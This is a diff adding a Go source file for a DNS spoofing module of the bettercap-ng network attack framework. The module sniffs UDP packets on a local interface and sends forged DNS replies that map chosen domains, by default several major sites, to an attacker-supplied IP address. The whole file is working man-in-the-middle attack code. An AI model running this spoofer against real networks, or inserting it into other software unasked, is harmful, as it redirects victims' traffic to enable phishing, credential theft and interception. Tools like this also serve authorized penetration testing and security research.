@@ -1,0 +1,233 @@
+package modules
+
+import (
+	"bytes"
+	"fmt"
+	"net"
+	"strings"
+
+	"github.com/evilsocket/bettercap-ng/core"
+	"github.com/evilsocket/bettercap-ng/log"
+	"github.com/evilsocket/bettercap-ng/packets"
+	"github.com/evilsocket/bettercap-ng/session"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+)
+
+type DNSSpoofer struct {
+	session.SessionModule
+	Handle  *pcap.Handle
+	Domains []string
+	Address net.IP
+}
+
+func NewDNSSpoofer(s *session.Session) *DNSSpoofer {
+	spoof := &DNSSpoofer{
+		SessionModule: session.NewSessionModule("dns.spoof", s),
+		Handle:        nil,
+	}
+
+	spoof.AddParam(session.NewStringParameter("dns.spoof.domains",
+		"microsoft.com, goole.com, facebook.com, apple.com, twitter.com",
+		``,
+		"Comma separated values of domain names to spoof."))
+
+	spoof.AddParam(session.NewStringParameter("dns.spoof.address",
+		session.ParamIfaceAddress,
+		`^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$`,
+		"IP address to map the domains to."))
+
+	spoof.AddHandler(session.NewModuleHandler("dns.spoof on", "",
+		"Start the DNS spoofer in the background.",
+		func(args []string) error {
+			return spoof.Start()
+		}))
+
+	spoof.AddHandler(session.NewModuleHandler("dns.spoof off", "",
+		"Stop the DNS spoofer in the background.",
+		func(args []string) error {
+			return spoof.Stop()
+		}))
+
+	return spoof
+}
+
+func (s DNSSpoofer) Name() string {
+	return "dns.spoof"
+}
+
+func (s DNSSpoofer) Description() string {
+	return "Replies to DNS messages with spoofed responses."
+}
+
+func (s DNSSpoofer) Author() string {
+	return "Simone Margaritelli <evilsocket@protonmail.com>"
+}
+
+func (s *DNSSpoofer) Configure() error {
+	var err error
+	var addr string
+
+	if s.Handle, err = pcap.OpenLive(s.Session.Interface.Name(), 65536, true, pcap.BlockForever); err != nil {
+		return err
+	}
+
+	err = s.Handle.SetBPFFilter("udp")
+	if err != nil {
+		return err
+	}
+
+	s.Domains = make([]string, 0)
+	if err, domains := s.StringParam("dns.spoof.domains"); err != nil {
+		return err
+	} else {
+		parts := strings.Split(domains, ",")
+		for _, part := range parts {
+			part = strings.Trim(part, "\t\n\r ")
+			if part != "" {
+				s.Domains = append(s.Domains, part)
+			}
+		}
+	}
+
+	if err, addr = s.StringParam("dns.spoof.address"); err != nil {
+		return err
+	}
+
+	s.Address = net.ParseIP(addr)
+
+	return nil
+}
+
+func (s *DNSSpoofer) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp *layers.UDP, domain string, req *layers.DNS, target net.HardwareAddr) {
+	redir := fmt.Sprintf("(->%s)", s.Address)
+	if t, found := s.Session.Targets.Targets[target.String()]; found == true {
+		log.Info("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(t.String()))
+	} else {
+		log.Info("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(target.String()))
+	}
+
+	pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
+
+	eth := layers.Ethernet{
+		SrcMAC:       peth.DstMAC,
+		DstMAC:       target,
+		EthernetType: layers.EthernetTypeIPv6,
+	}
+
+	ip6 := layers.IPv6{
+		Version:    6,
+		NextHeader: layers.IPProtocolUDP,
+		HopLimit:   64,
+		SrcIP:      pip.DstIP,
+		DstIP:      pip.SrcIP,
+	}
+
+	udp := layers.UDP{
+		SrcPort: pudp.DstPort,
+		DstPort: pudp.SrcPort,
+	}
+
+	udp.SetNetworkLayerForChecksum(&ip6)
+
+	answers := make([]layers.DNSResourceRecord, 0)
+	for _, q := range req.Questions {
+		answers = append(answers,
+			layers.DNSResourceRecord{
+				Name:  []byte(q.Name),
+				Type:  q.Type,
+				Class: q.Class,
+				TTL:   1024,
+				IP:    s.Address,
+			})
+	}
+
+	dns := layers.DNS{
+		ID:        req.ID,
+		QR:        true,
+		OpCode:    layers.DNSOpCodeQuery,
+		QDCount:   req.QDCount,
+		Questions: req.Questions,
+		Answers:   answers,
+	}
+
+	err, raw := packets.Serialize(&eth, &ip6, &udp, &dns)
+	if err != nil {
+		log.Error("Error serializing packet: %s.", err)
+		return
+	}
+
+	log.Debug("Sending %d bytes of packet ...", len(raw))
+	if err := s.Session.Queue.Send(raw); err != nil {
+		log.Error("Error sending packet: %s", err)
+	}
+}
+
+func (s *DNSSpoofer) shouldSpoof(domain string) bool {
+	if len(s.Domains) == 1 && s.Domains[0] == "*" {
+		return true
+	}
+
+	for _, d := range s.Domains {
+		if strings.HasSuffix(domain, d) == true {
+			return true
+		}
+	}
+	return false
+}
+
+func (s *DNSSpoofer) onPacket(pkt gopacket.Packet) {
+	eth := pkt.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
+	udp := pkt.Layer(layers.LayerTypeUDP).(*layers.UDP)
+
+	// DNS request for us?
+	if bytes.Compare(eth.DstMAC, s.Session.Interface.HW) == 0 {
+		dns, parsed := pkt.Layer(layers.LayerTypeDNS).(*layers.DNS)
+		if parsed == true && dns.OpCode == layers.DNSOpCodeQuery && len(dns.Questions) > 0 && len(dns.Answers) == 0 {
+			for _, q := range dns.Questions {
+				qName := string(q.Name)
+				if s.shouldSpoof(qName) == true {
+					s.dnsReply(pkt, eth, udp, qName, dns, eth.SrcMAC)
+					break
+				} else {
+					log.Debug("Skipping domain %s", qName)
+				}
+			}
+		}
+	}
+}
+
+func (s *DNSSpoofer) Start() error {
+	if s.Running() == true {
+		return session.ErrAlreadyStarted
+	} else if err := s.Configure(); err != nil {
+		return err
+	}
+
+	s.SetRunning(true)
+
+	go func() {
+		defer s.Handle.Close()
+
+		src := gopacket.NewPacketSource(s.Handle, s.Handle.LinkType())
+		for packet := range src.Packets() {
+			if s.Running() == false {
+				break
+			}
+
+			s.onPacket(packet)
+		}
+	}()
+
+	return nil
+}
+
+func (s *DNSSpoofer) Stop() error {
+	if s.Running() == false {
+		return session.ErrAlreadyStopped
+	}
+	s.SetRunning(false)
+	return nil
+}
